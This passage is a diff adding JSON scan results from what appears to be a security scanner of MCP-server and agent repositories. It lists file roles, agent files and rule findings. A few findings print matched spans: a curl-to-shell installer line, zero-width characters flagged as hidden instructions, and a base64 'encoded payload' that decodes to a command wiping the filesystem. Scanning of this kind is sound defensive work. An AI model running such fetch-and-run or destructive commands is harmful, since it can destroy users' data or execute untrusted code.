+    "hashicorp/terraform-mcp-server": {
+      "repo": "hashicorp/terraform-mcp-server",
+      "sha": "b4c8016f241461d7e6734c4c041bd504974e83a3",
+      "status": "ok",
+      "filesDownloaded": 444,
+      "filesScanned": 444,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 401,
+        "docs": 10,
+        "instruction": 6,
+        "config": 24,
+        "code": 3
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 220,
+      "ms": 1052,
+      "findings": []
+    },
+    "Get-Concord-AI/concord-mcp": {
+      "repo": "Get-Concord-AI/concord-mcp",
+      "sha": "6e6aa5d324d4be2a7bfed48acbb8431dd829cb72",
+      "status": "ok",
+      "filesDownloaded": 395,
+      "filesScanned": 395,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 15,
+        "docs": 26,
+        "config": 19,
+        "code": 321,
+        "unknown": 11,
+        "manifest": 3
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        "plugin/gemini/concord-relay/GEMINI.md",
+        "plugin/grok/concord-relay/skills/concord-relay/SKILL.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 328,
+      "ms": 1008,
+      "findings": []
+    },
+    "mbailey/voicemode": {
+      "repo": "mbailey/voicemode",
+      "sha": "cf15f72bec2ba16e097b4392f8e1f36282a34f3c",
+      "status": "ok",
+      "filesDownloaded": 590,
+      "filesScanned": 590,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 131,
+        "unknown": 32,
+        "config": 25,
+        "code": 372,
+        "instruction": 28,
+        "mcp-config": 2
+      },
+      "agentFiles": 15,
+      "agentFileSample": [
+        ".mcp.json",
+        ".claude/settings.json",
+        ".claude/commands/status.md",
+        ".claude/commands/converse.md",
+        ".claude/commands/install.md",
+        ".claude/skills/voicemode/references/voices.md",
+        ".claude/skills/voicemode/references/music.md",
+        ".claude/skills/voicemode/references/conch.md",
+        ".claude/skills/voicemode/references/recovery.md",
+        ".claude/skills/voicemode/references/controls.md",
+        ".claude/skills/voicemode/references/listening.md",
+        ".claude/skills/voicemode/references/impressions.md",
+        ".claude/skills/voicemode/references/surveys.md",
+        ".claude/skills/voicemode/SKILL.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 650,
+      "ms": 1956,
+      "findings": [
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "voice_mode/dependencies.yaml",
+          "line": 78,
+          "span": "curl -LsSf https://astral.sh/uv/install.sh | sh"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "installer/voicemode_install/dependencies.yaml",
+          "line": 78,
+          "span": "curl -LsSf https://astral.sh/uv/install.sh | sh"
+        }
+      ]
+    },
+    "mnemox-ai/tradememory-protocol": {
+      "repo": "mnemox-ai/tradememory-protocol",
+      "sha": "cb599bd3614560435670a7afaee44d1bb62ec507",
+      "status": "ok",
+      "filesDownloaded": 582,
+      "filesScanned": 582,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 82,
+        "config": 73,
+        "code": 300,
+        "instruction": 16,
+        "unknown": 110,
+        "manifest": 1
+      },
+      "agentFiles": 8,
+      "agentFileSample": [
+        "tradememory-plugin/skills/trading-memory/SKILL.md",
+        "tradememory-plugin/skills/evolution-engine/SKILL.md",
+        "tradememory-plugin/skills/risk-management/SKILL.md",
+        "skills/tradememory-bridge/SKILL.md",
+        "skills/binance-skills-hub/trade-memory/SKILL.md",
+        "AGENTS.md",
+        ".skills/strategy-validator/SKILL.md",
+        ".skills/tradememory/SKILL.md"
+      ],
+      "scanMs": 757,
+      "ms": 2122,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "tradememory-plugin/.mcp.json",
+          "line": 5,
+          "span": "tradememory-protocol"
+        }
+      ]
+    },
+    "robotmcp/ros-mcp-server": {
+      "repo": "robotmcp/ros-mcp-server",
+      "sha": "476591ac058f58cae810cc775e50b51f8d3d757c",
+      "status": "ok",
+      "filesDownloaded": 165,
+      "filesScanned": 164,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 20,
+        "code": 80,
+        "unknown": 29,
+        "docs": 22,
+        "instruction": 13
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 168,
+      "ms": 5877,
+      "findings": []
+    },
+    "designcomputer/mysql_mcp_server": {
+      "repo": "designcomputer/mysql_mcp_server",
+      "sha": "943ce83816372a03e5872be5424ebfcf252aa5ac",
+      "status": "ok",
+      "filesDownloaded": 23,
+      "filesScanned": 22,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 6,
+        "docs": 6,
+        "config": 3,
+        "code": 6,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 143,
+      "ms": 525,
+      "findings": []
+    },
+    "pipeboard-co/meta-ads-mcp": {
+      "repo": "pipeboard-co/meta-ads-mcp",
+      "sha": "63d0e5e29f2cf823f7f5317a77e66151eceb7415",
+      "status": "ok",
+      "filesDownloaded": 110,
+      "filesScanned": 110,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "docs": 5,
+        "config": 7,
+        "code": 89,
+        "instruction": 4
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 141,
+      "ms": 594,
+      "findings": []
+    },
+    "anypost/emailmd": {
+      "repo": "anypost/emailmd",
+      "sha": "3adb4e0f9b1f6619b15d1bb7e4366d4196fc3aa8",
+      "status": "ok",
+      "filesDownloaded": 258,
+      "filesScanned": 258,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 95,
+        "config": 14,
+        "instruction": 4,
+        "manifest": 4,
+        "docs": 11,
+        "code": 130
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 334,
+      "ms": 1065,
+      "findings": []
+    },
+    "awdr74100/figwright": {
+      "repo": "awdr74100/figwright",
+      "sha": "fe3173b72c43a5601c1906b7a7c10819bd79dbbb",
+      "status": "ok",
+      "filesDownloaded": 799,
+      "filesScanned": 799,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 15,
+        "config": 26,
+        "unknown": 26,
+        "code": 716,
+        "mcp-config": 2,
+        "instruction": 10,
+        "manifest": 4
+      },
+      "agentFiles": 9,
+      "agentFileSample": [
+        ".mcp.json",
+        ".claude/settings.json",
+        ".claude/skills/figma-typings-audit/SKILL.md",
+        ".claude/skills/mcp-sdk-audit/probe.mjs",
+        ".claude/skills/mcp-sdk-audit/SKILL.md",
+        "skills/figma-build/SKILL.md",
+        "skills/figma-codegen/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 760,
+      "ms": 6992,
+      "findings": []
+    },
+    "caol64/wenyan-mcp": {
+      "repo": "caol64/wenyan-mcp",
+      "sha": "83874e9eb3a9ac1b637330df0cceaf8b4784d902",
+      "status": "ok",
+      "filesDownloaded": 28,
+      "filesScanned": 28,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 5,
+        "unknown": 7,
+        "docs": 1,
+        "code": 12,
+        "instruction": 1,
+        "manifest": 1,
+        "mcp-config": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        ".vscode/mcp.json"
+      ],
+      "scanMs": 80,
+      "ms": 613,
+      "findings": []
+    },
+    "ihor-sokoliuk/mcp-searxng": {
+      "repo": "ihor-sokoliuk/mcp-searxng",
+      "sha": "d636d77c16649aee904d3521c45bcb88cadb3c3e",
+      "status": "ok",
+      "filesDownloaded": 148,
+      "filesScanned": 148,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 20,
+        "config": 21,
+        "unknown": 8,
+        "instruction": 2,
+        "code": 96,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 306,
+      "ms": 782,
+      "findings": []
+    },
+    "datalayer/jupyter-mcp-server": {
+      "repo": "datalayer/jupyter-mcp-server",
+      "sha": "cdf49eb7ced881553a32ea332882a0744ab0f62a",
+      "status": "ok",
+      "filesDownloaded": 417,
+      "filesScanned": 417,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 35,
+        "config": 72,
+        "unknown": 75,
+        "code": 215,
+        "instruction": 18,
+        "manifest": 1,
+        "mcp-config": 1
+      },
+      "agentFiles": 5,
+      "agentFileSample": [
+        "extensions/prompt-templates/notebook-review/AGENT.md",
+        "extensions/prompt-templates/general/AGENT.md",
+        ".github/copilot-instructions.md",
+        ".github/skills/code-review/SKILL.md",
+        ".vscode/mcp.json"
+      ],
+      "scanMs": 314,
+      "ms": 961,
+      "findings": []
+    },
+    "paulf280-ui/solana-safe-sniper-mcp-template": {
+      "repo": "paulf280-ui/solana-safe-sniper-mcp-template",
+      "sha": "c4f9aa22ff0d6aca58b467d1ae352a2d65e5fc65",
+      "status": "ok",
+      "filesDownloaded": 13,
+      "filesScanned": 13,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 4,
+        "unknown": 4,
+        "config": 2,
+        "mcp-config": 1,
+        "instruction": 1,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        ".mcp.json"
+      ],
+      "scanMs": 29,
+      "ms": 318,
+      "findings": []
+    },
+    "louis030195/apollo-io-mcp": {
+      "repo": "louis030195/apollo-io-mcp",
+      "sha": "9d71e0ac368687a89d73ca8389217abeaf5aa07f",
+      "status": "ok",
+      "filesDownloaded": 9,
+      "filesScanned": 9,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "code": 2,
+        "instruction": 1,
+        "config": 2,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 30,
+      "ms": 355,
+      "findings": []
+    },
+    "rinadelph/Agent-MCP": {
+      "repo": "rinadelph/Agent-MCP",
+      "sha": "13d98b2c9e770a97a77521e605e7e41db024852d",
+      "status": "ok",
+      "filesDownloaded": 276,
+      "filesScanned": 276,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 160,
+        "docs": 23,
+        "config": 9,
+        "instruction": 7,
+        "unknown": 73,
+        "manifest": 3,
+        "mcp-config": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "mcp.json"
+      ],
+      "scanMs": 318,
+      "ms": 1494,
+      "findings": []
+    },
+    "lodordev/mcp-tautulli": {
+      "repo": "lodordev/mcp-tautulli",
+      "sha": "ac421688cae4b55a77eb58673cf7e9e4d52a0fed",
+      "status": "ok",
+      "filesDownloaded": 18,
+      "filesScanned": 18,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 4,
+        "unknown": 5,
+        "docs": 2,
+        "config": 6,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 61,
+      "ms": 366,
+      "findings": []
+    },
+    "nitin27may/ms-graph-mcp": {
+      "repo": "nitin27may/ms-graph-mcp",
+      "sha": "5625f57a51a128880d39215038f92223d9ee526a",
+      "status": "ok",
+      "filesDownloaded": 133,
+      "filesScanned": 133,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 10,
+        "docs": 19,
+        "config": 10,
+        "code": 91,
+        "instruction": 3
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 131,
+      "ms": 498,
+      "findings": []
+    },
+    "thomasjumper/agentbay": {
+      "repo": "thomasjumper/agentbay",
+      "sha": "643a3d9c432f6fceaf297b756737c585adc900fd",
+      "status": "ok",
+      "filesDownloaded": 31,
+      "filesScanned": 31,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 6,
+        "config": 2,
+        "docs": 18,
+        "instruction": 3,
+        "code": 2
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 34,
+      "ms": 259,
+      "findings": []
+    },
+    "botwallet-co/mcp": {
+      "repo": "botwallet-co/mcp",
+      "sha": "a35195c85893a3df9be9db8126b8c05df176ba19",
+      "status": "ok",
+      "filesDownloaded": 96,
+      "filesScanned": 96,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 2,
+        "config": 7,
+        "code": 83,
+        "instruction": 1,
+        "manifest": 1,
+        "docs": 2
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 114,
+      "ms": 594,
+      "findings": []
+    },
+    "kevin2003050666-coder/x402-micro-tollgate": {
+      "repo": "kevin2003050666-coder/x402-micro-tollgate",
+      "sha": "55ac3b522780e807e58d9ff54609005696336134",
+      "status": "ok",
+      "filesDownloaded": 99,
+      "filesScanned": 99,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 5,
+        "config": 19,
+        "unknown": 8,
+        "code": 64,
+        "instruction": 2,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 152,
+      "ms": 509,
+      "findings": []
+    },
+    "JamesANZ/us-legal-mcp": {
+      "repo": "JamesANZ/us-legal-mcp",
+      "sha": "cde6f3b4ff7ee9ee98b1cc20782f3237bd4d7b7a",
+      "status": "ok",
+      "filesDownloaded": 22,
+      "filesScanned": 22,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 1,
+        "unknown": 3,
+        "code": 14,
+        "instruction": 1,
+        "config": 2,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 56,
+      "ms": 349,
+      "findings": []
+    },
+    "mathbeal/avenir-mcp": {
+      "repo": "mathbeal/avenir-mcp",
+      "sha": "8fad0440dd600d77ab6a60769eb1d164434928fa",
+      "status": "ok",
+      "filesDownloaded": 843,
+      "filesScanned": 843,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 228,
+        "config": 247,
+        "unknown": 196,
+        "code": 168,
+        "manifest": 1,
+        "instruction": 3
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 871,
+      "ms": 2265,
+      "findings": []
+    },
+    "blackwhite084/playwright-plus-python-mcp": {
+      "repo": "blackwhite084/playwright-plus-python-mcp",
+      "sha": "e5bdaad978ca041620c18e5614a7fd4987d5a4f8",
+      "status": "ok",
+      "filesDownloaded": 7,
+      "filesScanned": 7,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "config": 1,
+        "instruction": 1,
+        "code": 2
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 28,
+      "ms": 408,
+      "findings": []
+    },
+    "pierrebrunelle/mcp-server-openai": {
+      "repo": "pierrebrunelle/mcp-server-openai",
+      "sha": "67e598884e6fe7f28fc43bec2db8e37f482953ee",
+      "status": "ok",
+      "filesDownloaded": 7,
+      "filesScanned": 7,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 1,
+        "config": 1,
+        "instruction": 1,
+        "code": 4
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 29,
+      "ms": 367,
+      "findings": []
+    },
+    "apecloud/ApeRAG": {
+      "repo": "apecloud/ApeRAG",
+      "sha": "8668010b5227d1bdccc63e3709a53afda19f9227",
+      "status": "ok",
+      "filesDownloaded": 1100,
+      "filesScanned": 1100,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 73,
+        "code": 626,
+        "instruction": 25,
+        "unknown": 206,
+        "config": 169,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 1601,
+      "ms": 6177,
+      "findings": []
+    },
+    "SonAIengine/graph-tool-call": {
+      "repo": "SonAIengine/graph-tool-call",
+      "sha": "75b251a772f2b67e6a747724f2e9c1bbb21d09cf",
+      "status": "ok",
+      "filesDownloaded": 641,
+      "filesScanned": 641,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 23,
+        "docs": 183,
+        "instruction": 23,
+        "config": 99,
+        "code": 312,
+        "manifest": 1
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 1214,
+      "ms": 2095,
+      "findings": []
+    },
+    "jinzcdev/leetcode-mcp-server": {
+      "repo": "jinzcdev/leetcode-mcp-server",
+      "sha": "2eb3c79d3aad09991757e573a25c9890c8de9ca2",
+      "status": "ok",
+      "filesDownloaded": 57,
+      "filesScanned": 57,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "docs": 1,
+        "code": 43,
+        "instruction": 2,
+        "config": 6,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 100,
+      "ms": 426,
+      "findings": [
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "README_zh-CN.md",
+          "line": 16,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "README.md",
+          "line": 14,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "README.md",
+          "line": 16,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "README.md",
+          "line": 18,
+          "span": "\\u200B"
+        }
+      ]
+    },
+    "webdriverio/mcp": {
+      "repo": "webdriverio/mcp",
+      "sha": "1354cf886ec337c35356fb5172da87aa004a6308",
+      "status": "ok",
+      "filesDownloaded": 195,
+      "filesScanned": 195,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "config": 13,
+        "docs": 14,
+        "code": 161,
+        "instruction": 2,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 880,
+      "ms": 1320,
+      "findings": []
+    },
+    "AishwaryShrivastav/vibe-testing": {
+      "repo": "AishwaryShrivastav/vibe-testing",
+      "sha": "44cf2a3606595f4836cd003be9b4ffe776177b20",
+      "status": "ok",
+      "filesDownloaded": 189,
+      "filesScanned": 189,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 11,
+        "docs": 24,
+        "config": 12,
+        "instruction": 6,
+        "code": 133,
+        "mcp-config": 2,
+        "manifest": 1
+      },
+      "agentFiles": 7,
+      "agentFileSample": [
+        ".cursor/rules/vibe-test.mdc",
+        ".mcp.json",
+        ".cursorrules",
+        "skills/release-qa/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md",
+        "mcp.json"
+      ],
+      "scanMs": 1046,
+      "ms": 1720,
+      "findings": []
+    },
+    "alexsu1212/freebazi-mcp": {
+      "repo": "alexsu1212/freebazi-mcp",
+      "sha": "a8ea1f77576ace9476090036e0ba241a34516beb",
+      "status": "ok",
+      "filesDownloaded": 12,
+      "filesScanned": 12,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "config": 4,
+        "instruction": 1,
+        "manifest": 1,
+        "code": 3
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 330,
+      "ms": 778,
+      "findings": []
+    },
+    "GeiserX/genieacs-mcp": {
+      "repo": "GeiserX/genieacs-mcp",
+      "sha": "c2562c6bc5db28f6a666aa802456e9a83e97b9df",
+      "status": "ok",
+      "filesDownloaded": 89,
+      "filesScanned": 89,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 48,
+        "config": 19,
+        "code": 7,
+        "mcp-config": 1,
+        "instruction": 4,
+        "docs": 9,
+        "manifest": 1
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        ".claude/settings.json",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 518,
+      "ms": 1461,
+      "findings": []
+    },
+    "MvikManners/aw1-circuit-breaker": {
+      "repo": "MvikManners/aw1-circuit-breaker",
+      "sha": "1670ffe35fa91bf12ea3f601691cf5b446b25b99",
+      "status": "ok",
+      "filesDownloaded": 120,
+      "filesScanned": 120,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 67,
+        "unknown": 10,
+        "docs": 16,
+        "config": 20,
+        "instruction": 4,
+        "manifest": 1,
+        "mcp-config": 2
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".mcp.json",
+        "mcp.json"
+      ],
+      "scanMs": 300,
+      "ms": 2085,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": ".mcp.json",
+          "line": 3,
+          "span": "aw1-circuit-breaker"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "gemini-extension.json",
+          "line": 4,
+          "span": "aw1-circuit-breaker"
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "examples/enterprise_guard_demo.py",
+          "line": 21,
+          "span": "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
+        }
+      ]
+    },
+    "Dominic-DK/askew-mcp": {
+      "repo": "Dominic-DK/askew-mcp",
+      "sha": "0d08f3923a4350db313c8938534b7bd3a6dc363b",
+      "status": "ok",
+      "filesDownloaded": 37,
+      "filesScanned": 37,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 7,
+        "unknown": 3,
+        "code": 22,
+        "docs": 1,
+        "mcp-config": 2,
+        "instruction": 1,
+        "manifest": 1
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".mcp.json",
+        "mcp.json"
+      ],
+      "scanMs": 170,
+      "ms": 485,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": ".mcp.json",
+          "line": 5,
+          "span": "askew-mcp"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "mcp.json",
+          "line": 5,
+          "span": "askew-mcp"
+        }
+      ]
+    },
+    "anythink-cloud/anythink-cli": {
+      "repo": "anythink-cloud/anythink-cli",
+      "sha": "f6417008a0aacaae6700aa9e73bb8c32fd4e3caf",
+      "status": "ok",
+      "filesDownloaded": 272,
+      "filesScanned": 272,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 17,
+        "instruction": 5,
+        "unknown": 235,
+        "code": 6,
+        "docs": 8,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "skills/anythink/SKILL.md"
+      ],
+      "scanMs": 443,
+      "ms": 1062,
+      "findings": []
+    },
+    "ajibadedapo/flowproof-mcp": {
+      "repo": "ajibadedapo/flowproof-mcp",
+      "sha": "1bae15b029558979ab16a957ecf861707349d36a",
+      "status": "ok",
+      "filesDownloaded": 57,
+      "filesScanned": 57,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 10,
+        "config": 8,
+        "unknown": 16,
+        "code": 21,
+        "manifest": 1,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 119,
+      "ms": 542,
+      "findings": []
+    },
+    "OSOJDJD/deeplook": {
+      "repo": "OSOJDJD/deeplook",
+      "sha": "a2426bbca0065f6d51b0dcf04683364d2eca6bbd",
+      "status": "ok",
+      "filesDownloaded": 46,
+      "filesScanned": 46,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "config": 6,
+        "instruction": 1,
+        "code": 33,
+        "docs": 2
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 94,
+      "ms": 525,
+      "findings": []
+    },
+    "gchen19/AnkusDrive": {
+      "repo": "gchen19/AnkusDrive",
+      "sha": "c4aa8536ab5a0b728752eca8531da07c9925bde7",
+      "status": "ok",
+      "filesDownloaded": 554,
+      "filesScanned": 550,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 56,
+        "unknown": 74,
+        "config": 49,
+        "code": 358,
+        "instruction": 13
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        "skills/parallel-build/SKILL.md",
+        "skills/design-modularly/SKILL.md",
+        "skills/release-control/SKILL.md"
+      ],
+      "scanMs": 1194,
+      "ms": 7665,
+      "findings": []
+    },
+    "aethyn-io/aethyn-browser-mcp": {
+      "repo": "aethyn-io/aethyn-browser-mcp",
+      "sha": "8f698516e80a83cbeef228f61f3b9afb88447336",
+      "status": "ok",
+      "filesDownloaded": 21,
+      "filesScanned": 21,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 2,
+        "config": 6,
+        "docs": 3,
+        "instruction": 1,
+        "manifest": 1,
+        "code": 8
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 65,
+      "ms": 381,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "examples/cursor.json",
+          "line": 6,
+          "span": "aethyn-browser-mcp"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "examples/custom-proxy.json",
+          "line": 6,
+          "span": "aethyn-browser-mcp"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "examples/claude-desktop.json",
+          "line": 6,
+          "span": "aethyn-browser-mcp"
+        }
+      ]
+    },
+    "Aiven-Open/mcp-aiven": {
+      "repo": "Aiven-Open/mcp-aiven",
+      "sha": "d07c8eed0ad623cbe2c811384c32ef0e17a37253",
+      "status": "ok",
+      "filesDownloaded": 120,
+      "filesScanned": 120,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 8,
+        "config": 15,
+        "unknown": 7,
+        "code": 88,
+        "instruction": 1,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 134,
+      "ms": 589,
+      "findings": []
+    },
+    "ikoskela/wisepanel-mcp": {
+      "repo": "ikoskela/wisepanel-mcp",
+      "sha": "bfd4910651a095388577404a1e3a4c1072d79642",
+      "status": "ok",
+      "filesDownloaded": 10,
+      "filesScanned": 10,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 2,
+        "instruction": 1,
+        "config": 2,
+        "manifest": 1,
+        "code": 4
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 35,
+      "ms": 301,
+      "findings": []
+    },
+    "verifyax/verifyax-mcp": {
+      "repo": "verifyax/verifyax-mcp",
+      "sha": "a2fbf2f7022ca38815a61397bd622d3fed800ba3",
+      "status": "ok",
+      "filesDownloaded": 152,
+      "filesScanned": 152,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 17,
+        "unknown": 11,
+        "docs": 11,
+        "instruction": 5,
+        "code": 105,
+        "manifest": 3
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 234,
+      "ms": 599,
+      "findings": []
+    },
+    "sgx-labs/statelessagent": {
+      "repo": "sgx-labs/statelessagent",
+      "sha": "85e7ff20edf0533a499cbd6a7620da50f5989ec2",
+      "status": "ok",
+      "filesDownloaded": 458,
+      "filesScanned": 458,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 353,
+        "config": 31,
+        "docs": 50,
+        "code": 13,
+        "instruction": 8,
+        "mcp-config": 2,
+        "manifest": 1
+      },
+      "agentFiles": 4,
+      "agentFileSample": [
+        "eval/test_vault/.claude/settings.json",
+        "AGENTS.md",
+        "CLAUDE.md",
+        "mcp.json"
+      ],
+      "scanMs": 718,
+      "ms": 1566,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "examples/cursor-mcp.json",
+          "line": 5,
+          "span": "@sgx-labs/same"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "mcp.json",
+          "line": 7,
+          "span": "@sgx-labs/same"
+        }
+      ]
+    },
+    "contentasoftware/appledger": {
+      "repo": "contentasoftware/appledger",
+      "sha": "08d506d1f2b7e844792ab21f6a8bf84cf1acd009",
+      "status": "ok",
+      "filesDownloaded": 28,
+      "filesScanned": 28,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "config": 7,
+        "code": 15,
+        "instruction": 3
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "plugin/skills/check-my-app/SKILL.md"
+      ],
+      "scanMs": 135,
+      "ms": 652,
+      "findings": []
+    },
+    "kukapay/blockbeats-mcp": {
+      "repo": "kukapay/blockbeats-mcp",
+      "sha": "295c6aefb0cb7d2a43d390ce5d8c80e1dfd815ff",
+      "status": "ok",
+      "filesDownloaded": 9,
+      "filesScanned": 9,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "config": 2,
+        "instruction": 1,
+        "code": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 32,
+      "ms": 456,
+      "findings": []
+    },
+    "kskurtveit/echocache": {
+      "repo": "kskurtveit/echocache",
+      "sha": "285892bee9c4ec4211a8a3b1a37440c6b7cd2af4",
+      "status": "ok",
+      "filesDownloaded": 39,
+      "filesScanned": 39,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "config": 6,
+        "instruction": 11,
+        "docs": 1,
+        "manifest": 1,
+        "code": 16
+      },
+      "agentFiles": 10,
+      "agentFileSample": [
+        ".opencode/skills/echocache-cache/SKILL.md",
